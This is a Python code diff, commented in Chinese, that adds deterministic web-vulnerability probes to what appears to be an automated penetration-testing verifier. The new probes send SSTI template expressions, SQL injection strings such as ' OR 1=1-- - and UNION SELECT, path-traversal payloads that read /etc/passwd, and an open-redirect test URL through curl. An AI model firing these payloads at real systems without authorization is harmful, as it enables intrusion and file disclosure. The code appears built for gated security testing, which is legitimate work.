@@ -75,6 +75,14 @@ _FILE_SUFFIX = re.compile(
     r"(?i)\.(py|txt|sh|bash|conf|cfg|ini|json|ya?ml|log|md|xml|html?|php|pem|key|crt|cer|"
     r"cache|ccache|csv|tsv|db|sqlite|bak|out|tmp|zip|tar|gz|exe|dll|so|jar|ps1|bat)$")
 
+# —— web 漏洞确定性 oracle 痕迹（借归档 v1 validators 的手法）——
+_SQL_ERRORS = re.compile(
+    r"(?i)sqlite_error|sql syntax|syntax error|unrecognized token|near \"|incomplete input|"
+    r"unterminated|sqlstate|ora-\d|postgresql|psql|mysql|mariadb|sqlexception|odbc|"
+    r"you have an error in your sql|quoted string not properly terminated")
+_TOKEN_MARK = re.compile(r"(?i)\"authentication\"|\"token\"|bearer |\"jwt\"|\"access_token\"")
+_PASSWD_ROOT = re.compile(r"(?m)^root:[^:]*:0:0:")                     # /etc/passwd 的 root:...:0:0:
+
 
 @dataclass
 class ProbePolicy:
@@ -133,11 +141,36 @@ def _bare_hosts(text: str) -> list[str]:
     return hits
 
 
+def _parse_http(out: str) -> tuple[int, dict, str]:
+    """解析 curl -i 输出 → (status, headers(小写键), body)。curl -L 跟随时输出多段（每跳一段），
+    取**最后一段**（真实应用响应）；open_redirect 不跟随时只有一段（那个 3xx）。"""
+    blocks = [b for b in re.split(r"(?m)^(?=HTTP/\d)", out or "") if b.strip()]
+    seg = blocks[-1] if blocks else (out or "")
+    status = 0
+    headers: dict = {}
+    body = seg
+    m = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", seg)
+    if m:
+        status = int(m.group(1))
+    parts = re.split(r"\r?\n\r?\n", seg, maxsplit=1)
+    if len(parts) == 2:
+        head, body = parts
+        for line in head.splitlines():
+            if ":" in line and not line.upper().startswith("HTTP/"):
+                k, v = line.split(":", 1)
+                headers[k.strip().lower()] = v.strip()
+    return status, headers, body
+
+
 class Prober:
-    def __init__(self, sandbox, policy: ProbePolicy, llm=None):
+    def __init__(self, sandbox, policy: ProbePolicy, llm=None, oob=None):
         self.sb = sandbox
         self.policy = policy
         self.llm = llm
+        if oob is None:
+            from ..runtime.oob import NoopOOB   # 延迟导入避免 core↔runtime 顶层环
+            oob = NoopOOB()
+        self.oob = oob                               # 带外交互（SSRF/盲注用，Cut 2b 接真监听）
         self._spent = 0
         self._cache: dict[tuple, ProbeResult] = {}   # (method,target) 去重，避免对同一目标重复重活
 
@@ -160,7 +193,15 @@ class Prober:
             return await self._probe_domain_admin(foothold, proven_creds, traces)
         if r >= rank("shell"):
             return await self._probe_rce(foothold, traces)
-        return None   # web_user/web_admin/db_read：Stage 2 暂不主动探（Stage 3 的举证义务注册表）
+        # web 级（web_user/web_admin/db_read）：按 replay.probe_type 分派确定性 web 探针（Stage 3 Cut 2a）。
+        # 无 probe_type 或未知类型 → None（交 executor 的 PoC+LLM-judge 低信任路）。
+        replay = (foothold.get("props") or {}).get("replay") or foothold.get("replay") or {}
+        ptype = replay.get("probe_type") if isinstance(replay, dict) else None
+        probe = {"ssti": self._probe_ssti, "sqli": self._probe_sqli,
+                 "lfi": self._probe_lfi, "open_redirect": self._probe_open_redirect}.get(ptype)
+        if probe is not None:
+            return await probe(foothold, replay)
+        return None
 
     async def _probe_rce(self, foothold: dict, traces: list[dict]) -> ProbeResult:
         """shell/root：引擎自选随机 nonce 经该立足点访问向量回环，证 code exec（按主机限定）。"""
@@ -239,6 +280,176 @@ class Prober:
                               command=cmd, output=out)
         self._cache[key] = res
         return res
+
+    # ========== web 漏洞确定性探针（Stage 3 Cut 2a；经沙箱 curl → 自动 MITM 留痕 + scope）==========
+    def _web_guard(self, method: str) -> "ProbeResult | None":
+        """web 探针统一门禁：noise=low（幂等 HTTP 读式，外部授权目标也放行），受预算约束。"""
+        if not self.policy.active_allowed(NOISE_LOW):
+            return ProbeResult(INCONCLUSIVE, method, NOISE_PASSIVE,
+                               detail="策略不允许主动探针 → 降级（交 PoC+LLM-judge）", trust="none")
+        if not self._budget_left():
+            return ProbeResult(INCONCLUSIVE, method, NOISE_PASSIVE,
+                               detail="探针预算耗尽 → 降级", trust="none")
+        return None
+
+    async def _http(self, replay: dict, value: str, follow: bool = True) -> tuple[int, dict, str, str]:
+        """对注入点发一个请求(param=value)，经沙箱 curl（自动 MITM 留痕 + scope）。
+        follow=True 跟随重定向到真实应用响应（sqli/ssti/lfi 用，很多站点 30x 到规范/登录页）；
+        open_redirect 用 follow=False 以看见 3xx Location。返回 (status, headers, body, 实际命令)。"""
+        url = replay.get("url", "")
+        param = replay.get("param", "")
+        method = (replay.get("method") or "GET").upper()
+        inj = replay.get("injection", "query")
+        base = dict(replay.get("base_params") or {})
+        if not url or not param:
+            return 0, {}, "", ""
+        base[param] = value
+        flags = "-s -i -m 15" + (" -L" if follow else "")
+        if inj == "json_body":
+            import json as _json
+            cmd = (f"curl {flags} -X {_q(method)} {_q(url)} "
+                   f"-H 'Content-Type: application/json' --data {_q(_json.dumps(base))}")
+        elif inj == "form_body":
+            cmd = f"curl {flags} -X {_q(method)} {_q(url)}"
+            for k, v in base.items():
+                cmd += " --data-urlencode " + _q(f"{k}={v}")
+        else:  # query
+            cmd = f"curl {flags} -G {_q(url)}"
+            for k, v in base.items():
+                cmd += " --data-urlencode " + _q(f"{k}={v}")
+        _rc, out = await self._run(cmd, timeout=30)
+        status, headers, body = _parse_http(out)
+        return status, headers, body, cmd
+
+    async def _probe_ssti(self, foothold: dict, replay: dict) -> ProbeResult:
+        """SSTI：注入引擎自选两数之积——模板【真求值】才会出现乘积；表达式字面原样回显=未求值→反证。"""
+        guard = self._web_guard("ssti")
+        if guard:
+            return guard
+        a, b = secrets.randbelow(500) + 500, secrets.randbelow(500) + 500
+        product = str(a * b)
+        reflected = None
+        last = ("", "")
+        for expr in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"<%= {a}*{b} %>"):
+            status, _h, body, cmd = await self._http(replay, expr)
+            last = (body, cmd)
+            if status and status < 500 and product in (body or ""):
+                return ProbeResult(PROVEN, "ssti", NOISE_LOW,
+                                   detail=f"注入 `{expr}` 后响应出现乘积 {product}（模板真求值）",
+                                   command=cmd, output=(body or "")[:800], nonce=product)
+            if status and status < 500 and expr in (body or "") and reflected is None:
+                reflected = (expr, body, cmd)
+            if not self._budget_left():
+                break
+        if reflected:
+            e, b2, c2 = reflected
+            return ProbeResult(REFUTED, "ssti", NOISE_LOW,
+                               detail="表达式字面原样回显、未算出乘积 → 回显非求值（SSTI 声称反证）",
+                               command=c2, output=(b2 or "")[:800])
+        return ProbeResult(INCONCLUSIVE, "ssti", NOISE_LOW,
+                           detail="尝试的模板语法均未算出乘积、也无字面回显 → 无法确定（交兜底）",
+                           command=last[1], output=(last[0] or "")[:400])
+
+    async def _probe_sqli(self, foothold: dict, replay: dict) -> ProbeResult:
+        """SQLi：借 v1 三 oracle（报错型 / 认证绕过 / 布尔差分）+ union 引擎标记回环。
+        纪律：回显 payload 串不算证据；验不出一律 inconclusive（绝不写反证）。"""
+        guard = self._web_guard("sqli")
+        if guard:
+            return guard
+        base = str((replay.get("base_params") or {}).get(replay.get("param", ""), "1"))
+
+        def feat(status: int, body: str) -> dict:
+            return {"status": status, "len": len(body or ""),
+                    "token": bool(_TOKEN_MARK.search(body or "")),
+                    "sqlerr": bool(_SQL_ERRORS.search(body or ""))}
+
+        # oracle A：报错型（破语法 vs 平衡）
+        sb, _h, bb, cmd1 = await self._http(replay, base + "'")
+        sbal, _h2, bbal, _c = await self._http(replay, base + "''")
+        if sb and sb < 500 and _SQL_ERRORS.search(bb or "") and not _SQL_ERRORS.search(bbal or ""):
+            return ProbeResult(PROVEN, "sqli", NOISE_LOW,
+                               detail=f"注入 `{base}'` 触发 SQL 错误、`{base}''` 平衡后恢复（error-based）",
+                               command=cmd1, output=(bb or "")[:800])
+        # union 引擎标记回环（引擎自选 nonce 经 DB 带回）
+        nonce = _new_nonce()
+        for uni in (f"{base}' UNION SELECT '{nonce}'-- -",
+                    f"{base}' UNION SELECT '{nonce}',2-- -",
+                    f"{base}' UNION SELECT '{nonce}',2,3-- -"):
+            if not self._budget_left():
+                break
+            su, _hu, bu, cu = await self._http(replay, uni)
+            if su and su < 500 and nonce in (bu or ""):
+                return ProbeResult(PROVEN, "sqli", NOISE_LOW,
+                                   detail=f"UNION 注入把引擎标记 {nonce} 经 DB 带回响应（union）",
+                                   command=cu, output=(bu or "")[:800], nonce=nonce)
+        # oracle B/C：认证绕过 / 布尔差分（各重放两次确认稳定，借 v1 手法）
+        (t1s, _1, t1b, ct) = await self._http(replay, "' OR 1=1-- -")
+        (f1s, _2, f1b, _3) = await self._http(replay, "' OR 1=2-- -")
+        (t2s, _4, t2b, _5) = await self._http(replay, "' OR 1=1-- -")
+        (f2s, _6, f2b, _7) = await self._http(replay, "' OR 1=2-- -")
+        t1, f1, t2, f2 = feat(t1s, t1b), feat(f1s, f1b), feat(t2s, t2b), feat(f2s, f2b)
+        if all(x["status"] >= 500 for x in (t1, f1, t2, f2)) and (not sb or sb >= 500):
+            return ProbeResult(INCONCLUSIVE, "sqli", NOISE_LOW,
+                               detail="目标全 5xx 不可用 → 无法验证（不写反证）",
+                               command=ct, output=(t1b or "")[:400])
+
+        def same(x: dict, y: dict) -> bool:
+            return x["status"] == y["status"] and x["token"] == y["token"] and abs(x["len"] - y["len"]) <= 32
+
+        stable = same(t1, t2) and same(f1, f2)
+        if stable and t1["token"] and not f1["token"]:
+            return ProbeResult(PROVEN, "sqli", NOISE_LOW,
+                               detail="`' OR 1=1--` 返回认证令牌、`1=2` 不返（auth-bypass）",
+                               command=ct, output=(t1b or "")[:800])
+        if stable and not same(t1, f1):
+            return ProbeResult(PROVEN, "sqli", NOISE_LOW,
+                               detail="`1=1` vs `1=2` 响应稳定且显著差异（boolean-diff）",
+                               command=ct, output=(t1b or "")[:400])
+        return ProbeResult(INCONCLUSIVE, "sqli", NOISE_LOW,
+                           detail="报错/union/认证绕过/布尔四 oracle 均未取确定性证据 → unproven（不写反证）",
+                           command=cmd1, output=(bb or "")[:400])
+
+    async def _probe_lfi(self, foothold: dict, replay: dict) -> ProbeResult:
+        """LFI/路径遍历：读到引擎可预测内容（/etc/passwd 的 root:...:0:0: 结构）才算证成。"""
+        guard = self._web_guard("lfi")
+        if guard:
+            return guard
+        last = ("", "")
+        for p in ("/etc/passwd", "../../../../../../etc/passwd",
+                  "....//....//....//....//etc/passwd", "/etc/passwd%00",
+                  "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"):
+            status, _h, body, cmd = await self._http(replay, p)
+            last = (body, cmd)
+            if status and status < 500 and _PASSWD_ROOT.search(body or ""):
+                return ProbeResult(PROVEN, "lfi", NOISE_LOW,
+                                   detail="读到 /etc/passwd 的 root:...:0:0: 结构（真文件读，内容引擎可预测）",
+                                   command=cmd, output=(body or "")[:800])
+            if not self._budget_left():
+                break
+        return ProbeResult(INCONCLUSIVE, "lfi", NOISE_LOW,
+                           detail="各遍历 payload 均未读到可预测文件内容 → unproven（不写反证）",
+                           command=last[1], output=(last[0] or "")[:400])
+
+    async def _probe_open_redirect(self, foothold: dict, replay: dict) -> ProbeResult:
+        """开放重定向：3xx Location 恰为引擎自选唯一外部 URL → 参数真控重定向；指向自身 → 反证。"""
+        guard = self._web_guard("open_redirect")
+        if guard:
+            return guard
+        token = _new_nonce()
+        target = f"https://{token}.veritas-oob.example/vz"
+        status, headers, body, cmd = await self._http(replay, target, follow=False)   # 要看 3xx，不跟随
+        loc = headers.get("location", "")
+        if status and 300 <= status < 400 and loc:
+            if token in loc:
+                return ProbeResult(PROVEN, "open_redirect", NOISE_LOW,
+                                   detail=f"3xx Location 指向引擎自选唯一 URL（含 {token}）→ 参数真控重定向",
+                                   command=cmd, output=f"{status} Location: {loc}"[:400])
+            return ProbeResult(REFUTED, "open_redirect", NOISE_LOW,
+                               detail=f"3xx 但 Location=`{loc[:100]}` 非引擎 URL → 参数不控重定向（反证）",
+                               command=cmd, output=f"{status} Location: {loc}"[:400])
+        return ProbeResult(INCONCLUSIVE, "open_redirect", NOISE_LOW,
+                           detail="未发生 3xx 重定向 → 无法确定（交兜底）",
+                           command=cmd, output=f"status={status}")
 
     # ========== 凭据探针 ==========
     async def probe_credential(self, cred: dict, traces: list[dict]) -> ProbeResult | None:
